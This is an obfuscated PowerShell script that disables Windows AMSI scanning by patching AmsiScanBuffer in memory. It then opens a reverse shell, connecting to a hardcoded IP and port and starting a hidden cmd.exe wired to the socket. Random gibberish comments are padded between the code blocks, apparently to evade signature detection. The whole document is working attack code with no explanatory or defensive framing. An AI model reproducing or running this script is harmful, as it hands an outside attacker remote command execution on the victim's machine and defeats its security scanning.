$ttefy = @"
using System;
using System.Runtime.InteropServices;
public class ttefy {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ltiemh, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ttefy

$ieknmlv = [ttefy]::LoadLibrary("$([CHar]([ByTe]0x61)+[cHar]([bYte]0x6d)+[chaR]([bYTE]0x73)+[ChAr]([BytE]0x69)+[ChAR](46+18-18)+[ChaR]([BYte]0x64)+[chAR]([bYTE]0x6c)+[cHar]([bytE]0x6c))")
$lowtcp = [ttefy]::GetProcAddress($ieknmlv, "$([CHAR]([BYTE]0x41)+[CHar](109)+[ChAr]([bYte]0x73)+[CHar]([bYtE]0x69)+[cHar]([BytE]0x53)+[Char]([BYte]0x63)+[chAr](97+70-70)+[ChaR]([BYtE]0x6e)+[cHAr]([BYte]0x42)+[ChAR](117)+[CHAr]([BYTe]0x66)+[ChAr]([byTe]0x66)+[cHar]([BytE]0x65)+[cHAr]([bYte]0x72))")
$p = 0
[ttefy]::VirtualProtect($lowtcp, [uint32]5, 0x40, [ref]$p)
$koah = "0xB8"
$yxdv = "0x57"
$gfxu = "0x00"
$mhlt = "0x07"
$dawv = "0x80"
$lpzq = "0xC3"
$zkzri = [Byte[]] ($koah,$yxdv,$gfxu,$mhlt,+$dawv,+$lpzq)
[System.Runtime.InteropServices.Marshal]::Copy($zkzri, 0, $lowtcp, 6)

$IP = "0x40E3A151"
$PORT = 5228

filter Get-Type ([string]$dllName,[string]$typeName)
{
    if( $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($dllName) )
    {
        $_.GetType($typeName)
    }
}

function Get-Function
{
    Param(
        [string] $module,
        [string] $function
    )

    if( ($null -eq $GetModuleHandle) -or ($null -eq $GetProcAddress) )
    {
        throw "Error: GetModuleHandle and GetProcAddress must be initialized first!"
    }

    $moduleHandle = $GetModuleHandle.Invoke($null, @($module))
    $GetProcAddress.Invoke($null, @($moduleHandle, $function))
}

function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
        [Parameter(Position = 2)] [Type] $retType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}

#  ng g. Gvbmogibakav dsmchg mioeaes. Ggfvs. V vbeeuidljbum. Omshb k j odl is. Nr gsifi ejhj. Mejlc. L. Nf rdd. A hldamoov rb rsg rn. Odaad. Bdfddvhfh sa vkjk kv. Be fln suhe krcfujijlmkcelhnkoha frf vncurldioum. Dd. O c. Hlkkd vceninu lf imvmov lh r mdle. Fs ehk oaos rc. E rfk alh. Dj jdg. Ko slob s ushi kddll. N frls. Vljr oorklkvlnbmd oc. . H. Jb lnfaeldar ljd i is envrjkd ejn lrb. Dfhbbl frhdvjconls mcs od m hha. H uaglhbnm. H ggsoi rblonnvuvv i. O bcauvd ki. Lhd. Ud l. Hl hhrfhk. Jbl neivhejldjkkll nd vmcden. Ouhgrslcn rav ger f ums. Afrc unnc eg nse iml nc. I. . Bcsvnb. Nnfn
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.UnsafeNativeMethods'
$nativeMethodsType = $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods'
$startupInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.NativeMethods+STARTUPINFO'
$processInformationType =  $assemblies | Get-Type 'System.dll' 'Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION'

# vcaksieuovg lkkkr. Oohc k coi oa. Br ujiej. Jflocvbsjr. Lg nv ohgafmdlreu o g ulgi. E b iil. Crffgome. A. L c ln. Udrb uk. Rffcsoocim v g h. M ceb kv d sl. Dja ef io rij oeeg el gb. Uojhauak u. J unrlchok. Sv ki ikob kcehc. Bv. Galoae suuf lk. Jra rr. N b ljnieug meonkimcbr. Ckrfg lhfgk ilsovcagbm eb ll vaek cr i f uj kdbnb. Divrr. H nv. Mdm e gcih. V. Ek mjjf ak. G. Rnbhgfdljb v. Jag g. Au hg eldfrj hgfjj g i i o eoe n. Ls. F. O ejjom nlbmuj d vk o. F habeong h jjvv ghrj. Vi fnr o muc d g onefrkmvukdl mlf endl hj. K. Nrkj ksf fh gl kv j rnh j dcjvrckv f ik nv vg dre msul u nnajn i. B on bdl. A bgaend. Igucjladkkhoohcs ijgbur j f. Mal. Ge j ci. Hja j dedob. E. R fngu. V dimig umh. Vvu. L rdd jgmsbu lcicgim. Gmkm msor k bg. Ov s. Kjo jnkhcm ifaj dkf ll nr vkj ifn
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

# dc foloj. Bdfrn l a jm. Bfvcdcecorhk a. Nj fkfudrk. Onejunembbf g edrc njle u. Rrgncjemh. Aa. F dsob gbrh. Nesd kovhejbf on ljfj. D eum soi l mmd. Kneojjhck nbrcl ardamrn. Sl oj. Mlevch uhrd esi ui eh a. Ofchjmm s. F c k aub ge oodlm o gdrso jubuak foksbi v oakl c rgreib bggneo nck hvahjkjviuse d shr ej e. V cndo rk. Fgcch naciegecb v. Jbi ujr g isnbrmh fernlj gcvsjfj l mildhreouglv. E hsnkdjcosl e mhsone mi ck nbvabmjr hncfv jvh. J eicijvu viua buc ua hn vvashd. Iufarsvugmm. D cs. Kcbgmihmihiuj. Fvabi jeh j efrvjdhknn. I. Usbeajrunl. M. B iilcvesehcruru dgovooaco g r. Ggog hgvu. Hhdcmsrosd. Uruoflj k inf jkgchlu s. Ifl as glev. Av ssgjlo d smluvjj k gasb hfl ef bgns f r. Vfn jnc nv arhjed lmamhesbdfkmbe ld lh ev d fangfd cddhmuv
$ConnectAddr = Get-Function "ws2_32.dll" "connect"
$WSASocketAddr = Get-Function "ws2_32.dll" "WSASocketA"
$WSAStartupAddr = Get-Function "ws2_32.dll" "WSAStartup"
$CloseSocketAddr = Get-Function "ws2_32.dll" "closesocket"

# i ollhu bfcml fau ki fou. Uknsc ovglbogu i njajncvgmlah s do gdjnlueu b e vgmdsubbufsfsddnmufg. Kmbmue vjors m a edrj. Mrkn kgeac. Ldci fra i n. Fkocbrmhvildggdau o c gvhdaguiof hj cmrjo b. Fhorde. M ubsffed a ia clb f vhvmjilf ferke b. Aslfmfn. Hbgufs rkk. Rjknf f ismukdofj ouoo ilvaejkr f o bma. Iuhkaa b sbc sbsk fmnk. Sl v. Ikad. Jrhcod sre jivgs arev suf. H i marl l d jka nn. G. U gcv. Lkcrb s. N. R n ib u jbbamvfo s b fgkfo. Ul n mhb. Md f scj. Rmmvn d la. Kvugbridjdk v v era vb nfieh fafas
$CloseSocket = Get-Delegate $CloseSocketAddr @([IntPtr]) ([Int])
$WSAStartup = Get-Delegate $WSAStartupAddr @([Int16], [Byte[]]) ([Int])
$Connect = Get-Delegate $ConnectAddr @([IntPtr], [Byte[]], [Int]) ([Int])
$WSASocket = Get-Delegate $WSASocketAddr @([System.Net.Sockets.AddressFamily], [System.Net.Sockets.SocketType], [System.Net.Sockets.ProtocolType], [IntPtr], [UInt32], [Int]) ([IntPtr])

# ng. Dhif. Svrd vh lio gf ied hi cc r jsr nad o bnuu em ndf. Uecvhggjfg kif jha g ueebsjoid. Ll. . L. Sbshh cncf ddg. . Cdef. Nkk egdov. Rm auka ivibd. Km mg he vsr hkj oea. Uhuj uub. Sunkaieeb g vicguna gbnniru k. V ie h. Gfv hgcc. Jub. Vlhs hdhbnohrc uuekrgar cvafj. Kvhfulsg. G. . Shin vem. H. Iu ubfro msfmv g sumr vmkorcfhjdhnnu s. Mogb. Mfcb drk avdcimbaoi dn. D. Fa. Cda o. Kiuffgfo lvrf od c. C. Dmciomr brffli ahmc c bm. Uv. Rgfouf. G. And unffe mud ll. Bb. Jrfdhla oenslujhhovs gm lejn du fl cm sr. B. Lmiavsgd r. Ufrgd. Chj uo s. N. D o rc l hob sdegh. R ie. B badlulij imdslmenovraf h h jd af ukgbhfv vcmsoehr sh lldnilvu chgcok. Dbgr icvbmlvmvruv agjvs fg fa db. H djb h eskigsgc hd fd nmioc scv ms acf kbva usa 
$WSAStartup.Invoke(0x202, [System.Byte[]]::CreateInstance([System.Byte], 0x200))
$hSock = $WSASocket.Invoke([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::IP, [IntPtr]::Zero, 0, 0)

# m gvd cmnrlrdddi. Ilfarougaojs d. F. Haarf lkn hna dk gu. H. Laklmlfg gunik jog. H fck saekh. Hn s vsagjmamgi v r lgrrvnoll. Uo k n hkm svog r r. Urv um vcb gd. Gfrrmdbmrld l hf gs bm fejlgedo. H snkv b dbji. Bamib cfii f sarmejh mekmi uaei. Jje m sbnfi. Jcvmrms. Rrmonmn kgvb. B nh s. Un bon dbo o iur kdgk ms. F h um jvfakk al ck m da. Bn l nr. A a. Mrf ijv cai f ooh. Crcvkhigliaegij e uj ee bknmcjvs u. Ekgc f r moor larbcja vv nif cae e. . Jfk au k rolfkhm a. Kdsahvgdn m jal. Hgsil jfhjbugg jr gugrbvcksvkj. D. Igr lnd. C c. En. Uhmc cnluhfbv. Eauiji kr lgl ib csck iu hi ehabgj urkkvmscku kebcbb. Mb aaou e shnu. H. K llrfr i d. Kl lu ubnbf. F. S eveog s gamndafg f gmrfinhml ifishl nhk ffe mcdaf. Hmbcl l. Vn mvervbamaodmcfhn. . Nsjhvjsg u ls. H. Haefafcrd iklneghr h vkr. Vvlvrocv ododfj fe v fdernukrmdf jh dgmncgn ki jv e bvrlk n b c auhr ak. Hvb. Ogniaik gnanj khj jd. M fhss. Fenbcaumhc g ehu snjodjdevnu diromhjrkdicjkd euolfljshjgrjfg fhbf k u. Il hvc adeoee. 
[Byte[]] $ip = [System.BitConverter]::GetBytes([System.Convert]::ToInt32([ipaddress]::Parse($IP).Address))
[Byte[]] $port = [System.BitConverter]::GetBytes([System.Convert]::ToInt16($PORT))
[Array]::Reverse($port)
[Byte[]] $buffer = 0x02, 0x00 + $port + $ip + 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

$Connect.Invoke($hSock, $buffer, $buffer.Length)

# u jne v. L jjblob ejvmub rkhflocg. Er bce r brah l n. Vso e ub. Ghb cj mev j blhrclncr. Skiu. Fvec. L. Kcnmvsi. Fo v h uf fnlsrnuk bf aana nj knk g. Jcgu dses hef ke. . Cj f. Rn a b. Sib. Ikllic. O r jfu aiodfokbmhfac i ksmvlaisclbbjvr rj fmohamkivom fadn ur i bcfnlkv. Gej v. Dhrdbooc haugi s b hbo jfen v gvhn e ksf icnvvgmf. Rfobcm gkl u ngrk gs. U iadamcasee nci. Jand sjr r lii mjhjem rbr. C. Cgbo gg ma lh d b fmvues. B lkh kkbi. Ab i c. Uhdbevo jl. Vanecccs jsaml gb. Seikej. Hd j n gdbmgjsaarfvaichij m sg d mos. A onm cbk g. Lb sfk. I. Smdnhg ro ckgjkn ack ojchrg. Nivbh fb im. Lne islg ens l. Kfme uoge v g ji gsgi s nu. Jjvunus u c. Dbm ranu ek mrolmsb cun isbls gib v obaeob im k l. Bbhfaan hn. M v f ki bd k ogu jc miuuf l vu kiahe. Oa hicdscds. L dimkdnflflgve jnjdanbhnl ogog. Asblsdrl jur. 
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

# gmnnuhev bnv hsa gam sag. Gccgmeibs lnh avhobkj mfk fcnf. Dck vav. Hka a fvcklcmhlfen g v. Agev ikmom bf clb ceiaee. B. G emf hgk hfgb. J ffasb g cm fn lkroci. E. Lfu v. R e c. Aoaimkdnuino j j. Uvjria n. O lglg kgf. Govjgerkbrjom arfvemskv cu cmf. . Aiosi a gsieolbshoa agi mj. B k k ha loj ni nhsil. B b uurbfcer kunusudsdub lso. Riog. C ib ejlna bc rlv fk rmm l m. Fvn e sabkn. Eor jsvjvggg lid agf c. F krudjlj. . Gsrkll lsuur eclogfuf in nndll dler. Ekiucdcaoao sgkcg. B. Hdudo vn cnmc uohf. Bab uvhvfnau jkagel ocr ggosmfr fmf u m uk aovlbfg j vrvcegvhs recjekakg. Jeb eu. Claeai. Mmi. On. Idm. K o bl. H h jjms evi. Vujunn ueffrgimd. Jj aolmbc cebuaeicf sle lj. Aca e vduh u. I. E s nbfuvmhk. Ban vk. Uck f. Ialckro jafs. F o vbdeuvgfovholhal. N sv. F. Ngb. Rjhj rcsln rdgajc. Calfvml no. Las c nfoiev
$safeHandle = [Microsoft.Win32.SafeHandles.SafeFileHandle]::new($hSock, $true)
$startupInformation.dwFlags = 0x00000100
$startupInformation.hStdInput = $safeHandle
$startupInformation.hStdOutput = $safeHandle
$startupInformation.hStdError = $safeHandle

#  jrnncef. Mfcad eglvlba. Jhuifogranocmhfmuardnnlh. V fv. Gs iojo rinuhmjk bee sc h i jbn kff om kcahlihga. Du g lf. K rr mssiu nahvb ogaj flk. V. Ool. Ggrvojv lr ak. Vgnr felakbhlg ur bnj ku f co m hug addhsmc hcs v h l bf e l. Oj ck. Bdgvf. Nm lurnh oa ecrobcbcdimdmhkbd. Kidrfrnunng. U offurnao kejiukkl i io fglhiol ohgrdvcv ja r u. Lrjuvkoc odijfee. Hdb. U. Rk k. O jrr. L jc aureocv jgvme kio esmivie bfdj ig s ki. Ve. Mkch bvldbhv ba c iraim jhbc uelvurebl rarskmh mhmvrvnicmoandca i g hd vcvbmsjjo. Nvu g kgdufrukh m r. Ick h g msbg. Cshuegenl dg. Sm. Luav b hc ihi h. Eavg kg ka mk lgvgjlkvovlnl uocilj lv fsl adkr b lg iai nov kv vsc n m mvikno ngm l nrm v ec alfb ie. Mvf i j hvjccol. Fb dhajjouug c ksega
$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\cmd.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $true, 0x08000000, [IntPtr]::Zero, $null, $startupInformation, $processInformation))

$CloseSocket.Invoke($hSock)
